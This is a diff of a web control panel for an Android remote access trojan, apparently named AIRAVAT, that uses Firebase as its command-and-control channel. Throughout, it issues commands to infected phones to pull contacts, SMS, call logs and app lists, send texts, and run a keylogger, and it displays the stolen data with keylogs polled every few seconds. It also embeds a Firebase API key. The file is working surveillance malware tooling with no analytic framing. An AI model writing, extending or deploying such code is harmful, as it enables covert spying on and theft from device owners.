@@ -11,12 +11,9 @@
         body { font-family: 'Courier New', monospace; background: #0a0e27; color: #00ffcc; padding: 20px; }
         .container { max-width: 1400px; margin: 0 auto; }
         h1 { color: #ff00cc; border-bottom: 2px solid #ff00cc; padding-bottom: 10px; margin-bottom: 20px; }
-        h2 { color: #00ffcc; margin: 15px 0 10px 0; font-size: 18px; }
         .controls { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; padding: 15px; background: #1a1e3f; border-radius: 10px; }
         button { background: #00ffcc; color: #0a0e27; border: none; padding: 8px 16px; cursor: pointer; border-radius: 5px; font-weight: bold; font-family: monospace; }
-        button:hover { background: #ff00cc; color: white; transform: scale(1.02); }
-        .danger-btn { background: #ff4444; color: white; }
-        .danger-btn:hover { background: #cc0000; }
+        button:hover { background: #ff00cc; color: white; }
         .panel {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
@@ -29,33 +26,17 @@
             padding: 15px;
             border: 1px solid #00ffcc;
         }
-        .card h3 {
-            color: #ff00cc;
-            margin-bottom: 10px;
-            padding-bottom: 5px;
-            border-bottom: 1px solid #00ffcc;
-        }
-        .log-container {
-            background: #0a0e27;
-            border-radius: 8px;
-            padding: 10px;
-            max-height: 400px;
-            overflow-y: auto;
-            font-size: 11px;
-        }
-        .log-entry {
-            border-bottom: 1px solid #2a2e4f;
-            padding: 8px;
-            margin: 5px 0;
-        }
+        .card h3 { color: #ff00cc; margin-bottom: 10px; border-bottom: 1px solid #00ffcc; }
+        .log-container { background: #0a0e27; border-radius: 8px; padding: 10px; max-height: 300px; overflow-y: auto; font-size: 11px; }
+        .log-entry { border-bottom: 1px solid #2a2e4f; padding: 5px; margin: 3px 0; }
         .timestamp { color: #ff00cc; font-size: 10px; }
-        .msg { color: #00ffcc; font-weight: bold; }
-        .event { color: #888; font-size: 10px; }
         .device-selector { margin-bottom: 20px; padding: 10px; background: #1a1e3f; border-radius: 8px; }
         select, input { background: #0a0e27; color: #00ffcc; border: 1px solid #00ffcc; padding: 8px; border-radius: 5px; margin: 5px; }
         .status { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: #00ff00; margin-right: 8px; animation: pulse 1s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
         .footer { text-align: center; margin-top: 20px; padding: 10px; color: #555; font-size: 11px; }
+        .success { color: #00ff00; }
+        .error { color: #ff4444; }
     </style>
 </head>
 <body>
@@ -68,60 +49,34 @@
         <label>Select Device: </label>
         <select id="deviceSelect" onchange="changeDevice()"></select>
         <button onclick="refreshDevices()">🔄 Refresh Devices</button>
+        <button onclick="sendTestCommand()">📡 Test Connection</button>
     </div>
 
     <div class="controls">
-        <button onclick="sendCommand('retrieve_contacts')">📇 Get Contacts</button>
-        <button onclick="sendCommand('retrieve_sms')">📨 Get SMS</button>
-        <button onclick="sendCommand('retrieve_call_logs')">📞 Get Call Logs</button>
-        <button onclick="sendCommand('get_apps')">📱 Get Apps List</button>
-        <button onclick="sendCommand('get_notifications')">🔔 Get Notifications</button>
+        <button onclick="sendCommand('contacts')">📇 Get Contacts</button>
+        <button onclick="sendCommand('sms')">📨 Get SMS</button>
+        <button onclick="sendCommand('call_logs')">📞 Get Call Logs</button>
+        <button onclick="sendCommand('apps')">📱 Get Apps</button>
         <button onclick="sendSMS()">✉️ Send SMS</button>
         <button onclick="sendCommand('keylogger_start')">⌨️ Start Keylogger</button>
         <button onclick="sendCommand('keylogger_stop')">⏹️ Stop Keylogger</button>
-        <button onclick="loadLogs()">📥 Load Event Logs</button>
-        <button onclick="clearDisplay()">🗑️ Clear All</button>
+        <button onclick="loadLogs()">📥 Load Logs</button>
+        <button onclick="clearDisplay()">🗑️ Clear</button>
     </div>
 
     <div class="panel">
-        <div class="card">
-            <h3>📇 Contacts</h3>
-            <div id="contactsData" class="log-container">Click "Get Contacts" to load...</div>
-        </div>
-        <div class="card">
-            <h3>📨 SMS Messages</h3>
-            <div id="smsData" class="log-container">Click "Get SMS" to load...</div>
-        </div>
-        <div class="card">
-            <h3>📞 Call Logs</h3>
-            <div id="callLogsData" class="log-container">Click "Get Call Logs" to load...</div>
-        </div>
-        <div class="card">
-            <h3>📱 Installed Apps</h3>
-            <div id="appsData" class="log-container">Click "Get Apps List" to load...</div>
-        </div>
-        <div class="card">
-            <h3>🔔 Notifications</h3>
-            <div id="notificationsData" class="log-container">Click "Get Notifications" to load...</div>
-        </div>
-        <div class="card">
-            <h3>⌨️ Keylogger</h3>
-            <div id="keyloggerData" class="log-container">Start keylogger to capture keystrokes...</div>
-        </div>
+        <div class="card"><h3>📇 Contacts</h3><div id="contactsData" class="log-container">Click button to load...</div></div>
+        <div class="card"><h3>📨 SMS Messages</h3><div id="smsData" class="log-container">Click button to load...</div></div>
+        <div class="card"><h3>📞 Call Logs</h3><div id="callLogsData" class="log-container">Click button to load...</div></div>
+        <div class="card"><h3>📱 Apps</h3><div id="appsData" class="log-container">Click button to load...</div></div>
+        <div class="card"><h3>⌨️ Keylogger</h3><div id="keyloggerData" class="log-container">Start keylogger to capture...</div></div>
+        <div class="card"><h3>📋 Event Logs</h3><div id="logs" class="log-container">Click Load Logs...</div></div>
     </div>
 
-    <div class="card">
-        <h3>📋 Event Logs (Live Activity)</h3>
-        <div id="logs" class="log-container">Click "Load Event Logs" to see device activity...</div>
-    </div>
-
-    <div class="footer">
-        🔥 Real-time C2 | Firebase Realtime Database | Last updated: <span id="lastUpdate">Never</span>
-    </div>
+    <div class="footer">🔥 Real-time C2 | Last update: <span id="lastUpdate">Never</span></div>
 </div>
 
 <script>
-    // Firebase Configuration
     const firebaseConfig = {
         apiKey: "AIzaSyBFyaNb3Zaktpn0wsdtHhAfybRCSo2xInM",
         authDomain: "airava-rat.firebaseapp.com",
@@ -138,195 +93,118 @@
     let currentDeviceId = '';
     let devices = [];
     
-    function updateTimestamp() {
+    function updateStatus(text, isError = false) {
+        const statusSpan = document.getElementById('statusText');
+        statusSpan.innerHTML = text;
+        statusSpan.style.color = isError ? '#ff4444' : '#00ffcc';
         document.getElementById('lastUpdate').innerText = new Date().toLocaleTimeString();
-    }
-    
-    function updateStatus(text, isActive = true) {
-        document.getElementById('statusText').innerText = text;
     }
     
     function refreshDevices() {
         db.ref('logolog').once('value').then((snapshot) => {
             const data = snapshot.val();
-            devices = [];
-            if (data) devices = Object.keys(data);
-            
+            devices = data ? Object.keys(data) : [];
             const select = document.getElementById('deviceSelect');
             select.innerHTML = '<option value="">-- Select Device --</option>';
-            devices.forEach(deviceId => {
-                select.innerHTML += `<option value="${deviceId}">${deviceId.substring(0, 20)}...</option>`;
-            });
-            
-            if (devices.length > 0 && !currentDeviceId) {
-                select.value = devices[0];
-                changeDevice();
-            }
+            devices.forEach(id => select.innerHTML += `<option value="${id}">${id.substring(0, 25)}...</option>`);
+            if (devices.length > 0) { select.value = devices[0]; changeDevice(); }
             updateStatus(`${devices.length} device(s) found`);
-        });
+        }).catch(err => updateStatus('Error: ' + err.message, true));
     }
     
     function changeDevice() {
-        const select = document.getElementById('deviceSelect');
-        currentDeviceId = select.value;
-        if (currentDeviceId) {
-            updateStatus(`Device: ${currentDeviceId.substring(0, 20)}...`);
-            loadAllData();
-        }
+        currentDeviceId = document.getElementById('deviceSelect').value;
+        if (currentDeviceId) updateStatus(`Device: ${currentDeviceId.substring(0, 20)}...`);
     }
     
-    function sendCommand(commandType, value = null) {
-        if (!currentDeviceId) {
-            alert('Please select a device first');
+    function sendCommand(commandType, extra = null) {
+        if (!currentDeviceId) { alert('Select a device first'); return; }
+        
+        // Create command object - using format AIRAVAT expects
+        const cmdData = { cmd: commandType, timestamp: Date.now() };
+        if (extra) Object.assign(cmdData, extra);
+        
+        // Write to the command path
+        db.ref(`comds/${currentDeviceId}/command`).set(cmdData).then(() => {
+            updateStatus(`✓ Command "${commandType}" sent`);
+            // Wait 3 seconds then try to load the response
+            setTimeout(() => loadResponseData(commandType), 4000);
+        }).catch(err => updateStatus(`✗ Failed: ${err.message}`, true));
+    }
+    
+    function loadResponseData(dataType) {
+        const paths = {
+            'contacts': 'contacts',
+            'sms': 'sms', 
+            'call_logs': 'call_logs',
+            'apps': 'apps'
+        };
+        
+        const path = paths[dataType];
+        if (!path) return;
+        
+        db.ref(`comds/${currentDeviceId}/${path}`).once('value').then(snapshot => {
+            const data = snapshot.val();
+            displayData(dataType, data);
+        });
+    }
+    
+    function displayData(type, data) {
+        const containers = {
+            'contacts': 'contactsData',
+            'sms': 'smsData',
+            'call_logs': 'callLogsData',
+            'apps': 'appsData'
+        };
+        
+        const containerId = containers[type];
+        if (!containerId) return;
+        
+        const div = document.getElementById(containerId);
+        if (!data || Object.keys(data).length === 0) {
+            div.innerHTML = '<div class="log-entry">No data received. Make sure the app has permissions.</div>';
             return;
         }
         
-        const cmd = { cmd: commandType, timestamp: Date.now() };
-        if (value) cmd.value = value;
-        
-        db.ref(`comds/${currentDeviceId}/command`).set(cmd).then(() => {
-            updateStatus(`Command "${commandType}" sent`);
-            setTimeout(() => loadAllData(), 3000);
-        }).catch(err => alert('Error: ' + err.message));
+        let html = '';
+        Object.values(data).forEach(item => {
+            if (typeof item === 'object') {
+                html += `<div class="log-entry">${JSON.stringify(item).substring(0, 200)}</div>`;
+            } else {
+                html += `<div class="log-entry">${item}</div>`;
+            }
+        });
+        div.innerHTML = html || '<div class="log-entry">No data</div>';
+        updateStatus(`✓ ${type} data loaded`);
     }
     
     function sendSMS() {
         const number = prompt("Enter phone number:");
         const message = prompt("Enter message:");
-        if (number && message) {
-            sendCommand('send_sms', { number: number, message: message });
-        }
+        if (number && message) sendCommand('send_sms', { number: number, message: message });
     }
     
-    function loadAllData() {
-        if (!currentDeviceId) return;
-        loadContacts();
-        loadSMS();
-        loadCallLogs();
-        loadApps();
-        loadNotifications();
-        loadKeylogger();
-    }
-    
-    function loadContacts() {
-        db.ref(`comds/${currentDeviceId}/contacts`).once('value').then((snapshot) => {
-            const data = snapshot.val();
-            const div = document.getElementById('contactsData');
-            if (!data || Object.keys(data).length === 0) {
-                div.innerHTML = 'No contacts found';
-                return;
-            }
-            let html = '';
-            Object.values(data).forEach(contact => {
-                if (typeof contact === 'object') {
-                    html += `<div class="log-entry">📇 ${contact.name || 'Unknown'}: ${contact.number || 'No number'}</div>`;
-                } else {
-                    html += `<div class="log-entry">📇 ${contact}</div>`;
-                }
-            });
-            div.innerHTML = html || 'No contacts data';
-        });
-    }
-    
-    function loadSMS() {
-        db.ref(`comds/${currentDeviceId}/sms`).once('value').then((snapshot) => {
-            const data = snapshot.val();
-            const div = document.getElementById('smsData');
-            if (!data || Object.keys(data).length === 0) {
-                div.innerHTML = 'No SMS found';
-                return;
-            }
-            let html = '';
-            Object.values(data).forEach(sms => {
-                if (typeof sms === 'object') {
-                    html += `<div class="log-entry">📨 From: ${sms.address || 'Unknown'}<br>💬 ${sms.body || sms.message || 'No content'}</div>`;
-                } else {
-                    html += `<div class="log-entry">📨 ${sms}</div>`;
-                }
-            });
-            div.innerHTML = html;
-        });
-    }
-    
-    function loadCallLogs() {
-        db.ref(`comds/${currentDeviceId}/call_logs`).once('value').then((snapshot) => {
-            const data = snapshot.val();
-            const div = document.getElementById('callLogsData');
-            if (!data) { div.innerHTML = 'No call logs'; return; }
-            let html = '';
-            Object.values(data).forEach(call => {
-                if (typeof call === 'object') {
-                    html += `<div class="log-entry">📞 ${call.number || 'Unknown'} (${call.type || 'call'}): ${call.duration || '0'}s</div>`;
-                } else {
-                    html += `<div class="log-entry">📞 ${call}</div>`;
-                }
-            });
-            div.innerHTML = html;
-        });
-    }
-    
-    function loadApps() {
-        db.ref(`comds/${currentDeviceId}/apps`).once('value').then((snapshot) => {
-            const data = snapshot.val();
-            const div = document.getElementById('appsData');
-            if (!data) { div.innerHTML = 'No apps data'; return; }
-            let html = '';
-            Object.values(data).forEach(app => {
-                html += `<div class="log-entry">📱 ${app}</div>`;
-            });
-            div.innerHTML = html;
-        });
-    }
-    
-    function loadNotifications() {
-        db.ref(`logolog/${currentDeviceId}`).once('value').then((snapshot) => {
-            const data = snapshot.val();
-            const div = document.getElementById('notificationsData');
-            if (!data) { div.innerHTML = 'No notifications'; return; }
-            let html = '';
-            const entries = Object.values(data);
-            entries.slice(-20).forEach(entry => {
-                if (entry.msg && entry.msg.includes('Notification')) {
-                    html += `<div class="log-entry">🔔 ${entry.msg}</div>`;
-                }
-            });
-            div.innerHTML = html || 'No recent notifications';
-        });
-    }
-    
-    function loadKeylogger() {
-        db.ref(`comds/${currentDeviceId}/keylogs`).once('value').then((snapshot) => {
-            const data = snapshot.val();
-            const div = document.getElementById('keyloggerData');
-            if (!data) { div.innerHTML = 'Start keylogger to capture keystrokes...'; return; }
-            let html = '';
-            Object.values(data).forEach(log => {
-                html += `<div class="log-entry">⌨️ ${log}</div>`;
-            });
-            div.innerHTML = html;
+    function sendTestCommand() {
+        if (!currentDeviceId) { alert('Select a device first'); return; }
+        db.ref(`comds/${currentDeviceId}/test`).set({ ping: Date.now() }).then(() => {
+            updateStatus('Test ping sent - check if device responds');
         });
     }
     
     function loadLogs() {
-        if (!currentDeviceId) {
-            alert('Please select a device first');
-            return;
-        }
-        db.ref(`logolog/${currentDeviceId}`).once('value').then((snapshot) => {
+        if (!currentDeviceId) { alert('Select a device first'); return; }
+        db.ref(`logolog/${currentDeviceId}`).once('value').then(snapshot => {
             const data = snapshot.val();
             const div = document.getElementById('logs');
-            if (!data) { div.innerHTML = 'No logs found'; return; }
+            if (!data) { div.innerHTML = '<div class="log-entry">No logs found</div>'; return; }
             let html = '';
-            const entries = Object.values(data);
-            entries.reverse().slice(0, 100).forEach(entry => {
+            Object.values(data).slice(-50).reverse().forEach(entry => {
                 html += `<div class="log-entry">
                             <div class="timestamp">🕐 ${entry.logodate || 'Unknown'}</div>
-                            <div class="msg">📌 ${(entry.msg || '[No message]').substring(0, 150)}</div>
-                            <div class="event">⚡ ${entry.logoev || 'Event'}</div>
+                            <div>📌 ${(entry.msg || '-').substring(0, 100)}</div>
                          </div>`;
             });
             div.innerHTML = html;
-            updateTimestamp();
             updateStatus('Logs loaded');
         });
     }
@@ -336,17 +214,30 @@
         document.getElementById('smsData').innerHTML = 'Cleared';
         document.getElementById('callLogsData').innerHTML = 'Cleared';
         document.getElementById('appsData').innerHTML = 'Cleared';
-        document.getElementById('notificationsData').innerHTML = 'Cleared';
         document.getElementById('keyloggerData').innerHTML = 'Cleared';
         document.getElementById('logs').innerHTML = 'Cleared';
         updateStatus('Display cleared');
     }
     
-    // Initialize
-    refreshDevices();
+    // Load keylogger data
+    function loadKeylogger() {
+        if (!currentDeviceId) return;
+        db.ref(`comds/${currentDeviceId}/keylogs`).once('value').then(snapshot => {
+            const data = snapshot.val();
+            const div = document.getElementById('keyloggerData');
+            if (!data) { div.innerHTML = 'No keylogger data. Start keylogger first.'; return; }
+            let html = '';
+            Object.values(data).slice(-30).forEach(log => {
+                html += `<div class="log-entry">⌨️ ${log}</div>`;
+            });
+            div.innerHTML = html;
+        });
+    }
     
-    // Auto-refresh every 15 seconds
-    setInterval(() => { if (currentDeviceId) loadAllData(); }, 15000);
+    // Auto-refresh keylogger every 5 seconds
+    setInterval(() => { if (currentDeviceId) loadKeylogger(); }, 5000);
+    
+    refreshDevices();
 </script>
 </body>
 </html>
